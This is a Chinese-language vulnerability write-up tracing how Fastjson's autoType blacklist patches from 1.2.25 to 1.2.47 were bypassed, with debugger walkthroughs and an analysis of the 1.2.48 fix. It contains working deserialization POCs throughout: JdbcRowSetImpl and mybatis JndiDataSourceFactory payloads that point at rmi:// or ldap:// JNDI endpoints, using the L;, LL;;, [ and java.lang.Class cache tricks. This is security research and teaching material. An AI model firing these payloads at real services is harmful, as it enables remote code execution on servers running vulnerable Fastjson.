# 环境搭建

还是用maven项目一键引入依赖

```
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.25</version>
</dependency>
```

# 1.2.25-1.2.41补丁绕过

之前说过在1.2.25的版本中把原来的TypeUtils.loadClass替换成了checkAutoType函数

在这个方法里面有一个autoTypeSupport参数默认为false

## 漏洞复现

这里需要开启autoTypeSupport

```
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
```

POC

```
package Fastjson.Test;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class Unser {
    public static void main(String[] argv) throws Exception{
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://localhost:1099/badNameClass\", \"autoCommit\":true}";
        JSON.parse(payload);
    }
}

{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/Exploit","autoCommit":true}}}
```

可以看到这里的payload相比于1.2.24的只是在利用类前面多了一个L，结尾多了一个分号

## 漏洞分析

前面的流程和1.2.24是一样的,当autoTypeSupport开启的时候进入checkAutoType方法看看

![image-20220302155326963](images/1.png)

进入else分支里面的if

可以看到这里加上了一个L绕过了黑名单的匹配

接下来就是一堆去获取clazz的操作

![image-20220302160717682](images/2.png)

但是因为typeName加上了一个L是不存在的,所以这里的clazz一直是为null

然后就一路跟进到了这一个if,满足了判断

![image-20220302160833347](images/3.png)

进入TypeUtils.loadClass

![image-20220302161512727](images/4.png)

这里进入了这个elseif，判断是否以L开头，以分号结尾

然后这里去掉开头和结尾的字符得到一个新的newClassName，最后loadClass

接下来后面的流程也是和前面的一样,这样就绕过了这个补丁

# 1.2.25-1.2.42补丁绕过

从1.2.42开始，ParserConfig.java中的黑名单就变为了hash黑名单

![image-20220302163628090](images/5.png)

目的是防止对黑名单进行分析绕过，目前已经破解出来的黑名单见：https://github.com/LeadroyaL/fastjson-blacklist

## 漏洞分析

还是跟进checkAutoType去看看

![image-20220302164043814](images/6.png)

在这个方法中多了一个对className的提取操作,所以再多加上一个`L`和`;`来绕过黑名单

接下来的操作和上面差不多,只是对这些黑名单的判断变为了hash值

![image-20220302164432493](images/7.png)

但是注意到这里执行到TypeUtils.loadClass的时候进入的参数不是className而是typeName

在去除首尾一个字符后还是`Lcom.sun.rowset.JdbcRowSetImpl;`

![image-20220302164639763](images/8.png)

那怎么办呢,继续跟进loadClass，发现可以循环跟进到这个loadClass方法,然后正常的加载类

继续跟进后的参数

![image-20220302164816943](images/9.png)

就和上面一样了,最后正常的loadClass

## 漏洞复现

一样要开启autoTypeSupport

POC

```
package Fastjson.Test;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class Unser {
    public static void main(String[] argv) throws Exception{
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://localhost:1099/badNameClass\", \"autoCommit\":true}";
        JSON.parse(payload);
    }
}
```

![image-20220302164919232](images/10.png)

在1.2.22-1.2.42版本运行都能成功触发

因为多加的一个`L`和`;`只是为了绕过黑名单,而真正的处理还是loadClass方法的循环调用机制

# 1.2.25-1.2.43补丁绕过

在1.2.43的版本中,checkAutoType里面添加了如下代码，连续出现两个L会抛出异常

![image-20220302182423045](images/11.png)

## 绕过思路

可以再来看看loadClass方法

![image-20220302190037919](images/12.png)

我们之前用的都是第二个elseif，都是现在两个L会报错，不过可以来看看第一个elseif，如果以`[`开头的话也会去掉第一个字符然后通过Array.newInstance().getClass()来获取并返回类

可以用如下payload试试看

```
{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/badNameClass\", \"autoCommit\":true}
```

出现了这样的报错

```
Exception in thread "main" com.alibaba.fastjson.JSONException: exepct '[', but ,, pos 42, json : {"@type":"[com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/badNameClass", "autoCommit":true}
	at com.alibaba.fastjson.parser.DefaultJSONParser.parseArray(DefaultJSONParser.java:675)
	at com.alibaba.fastjson.serializer.ObjectArrayCodec.deserialze(ObjectArrayCodec.java:183)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:373)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1338)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1304)
	at com.alibaba.fastjson.JSON.parse(JSON.java:152)
	at com.alibaba.fastjson.JSON.parse(JSON.java:162)
	at com.alibaba.fastjson.JSON.parse(JSON.java:131)
	at Fastjson.Test.Unser.main(Unser.java:10)
```

说希望在pos42的位置有一个`[`

看看pos42是什么

![image-20220302190700128](images/13.png)

因为是从0开始的,所以42列应该是`,`，也就是应该在`,`前面加上一个`[`

更换payload为

```
{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[,\"dataSourceName\":\"rmi://localhost:1099/badNameClass\", \"autoCommit\":true}
```

![image-20220302190832481](images/14.png)

在43列的位置希望出现一个`{`

再次更换payload为

```
{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"rmi://localhost:1099/badNameClass\", \"autoCommit\":true}
```

![image-20220302190933198](images/15.png)

## 漏洞分析

前面依然不变一路跟到了loadClass

![image-20220302191317148](images/16.png)

处理后获取到了我们的利用类，通过`Array.newInstance.getClass()`来实例化

退出来后会到parseObject

![image-20220302191458484](images/17.png)

跟进deserialize，步进到parseArray

![image-20220302191520707](images/18.png)

跟进parseArray

![image-20220302191653722](images/19.png)

这里就是刚才报错的代码了

只要满足他的要求就能绕过

## 漏洞复现

POC

```
package Fastjson.Test;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class Unser {
    public static void main(String[] argv) throws Exception{
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"rmi://localhost:1099/badNameClass\", \"autoCommit\":true}";
        JSON.parse(payload);
    }
}
```

![image-20220302190939277](images/20.png)

# 1.2.25-1.2.45补丁绕过

需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列<3.5.0的版本

这里就记录一个payload就是了

```
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://localhost:1389/badNameClass"}}
```

# 1.2.25-1.2.47通杀

 这里有两个版本段：

- 1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport不能利用
- 1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用

漏洞原理：通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测

## 漏洞分析

因为不开启AutoTypeSupport都能利用成功，这里就只分析不开启的情况了

一样的来到了checkAutoType方法

![image-20220303214834510](images/21.png)

这里因为autoTypeSupport默认为false，所以不会进入黑名单检测

但是以为此时的typeName是java.lang.Class，findClass能够找到所以后面的clazz不为空会直接返回

![image-20220303214922556](images/22.png)

进入if返回clazz

![image-20220303215019844](images/23.png)

回到DefaultJSONParser的parseObject方法一路步进到

![image-20220303215120277](images/24.png)

跟进deserialize方法来到了MiscCodec类的deserialize方法

![image-20220303215325280](images/25.png)

这里的strVal是com.sun.rowset.JdbcRowSetImpl

跟进TypeUtils.loadClass

![image-20220303215403825](images/26.png)

这里将com.sun.rowset.JdbcRowSetImpl通过put放入map的缓存中

当下一次执行到checkAutoType的时候会通过TypeUtils.getClassFromMapping获取到map缓存的类

![image-20220303224139981](images/27.png)

跟进TypeUtils.getClassFromMapping

![image-20220303224216599](images/28.png)

这样就获取到了我们的利用类com.sun.rowset.JdbcRowSetImpl，后面的流程就是一样的了

## 漏洞复现

POC

```
package Fastjson.Test;

import com.alibaba.fastjson.JSON;

public class Unser {
    public static void main(String[] argv) throws Exception{
        String payload = "{\n" +
                "    \"a\":{\n" +
                "        \"@type\":\"java.lang.Class\",\n" +
                "        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +
                "    },\n" +
                "    \"b\":{\n" +
                "        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "        \"dataSourceName\":\"rmi://127.0.0.1:1099/badNameClass\",\n" +
                "        \"autoCommit\":true\n" +
                "    }\n" +
                "}";
        JSON.parse(payload);
    }
}

```

![image-20220303224949902](images/29.png)



# 1.2.48补丁分析

在这里的loadClass将缓存开关cache设置为false

![image-20220303230042990](images/30.png)

无法进入这里的if判断，就不能将利用类写入缓存了

![image-20220303230236784](images/31.png)

而且Class类被加入了黑名单

![image-20220303230517331](images/32.png)

参考链接

https://xz.aliyun.com/t/9052#toc-15

https://www.mi1k7ea.com/2019/11/10/Fastjson%E7%B3%BB%E5%88%97%E4%B8%89%E2%80%94%E2%80%94%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC%E8%A1%A5%E4%B8%81%E7%BB%95%E8%BF%87%EF%BC%88%E9%9C%80%E5%BC%80%E5%90%AFAutoType%EF%BC%89/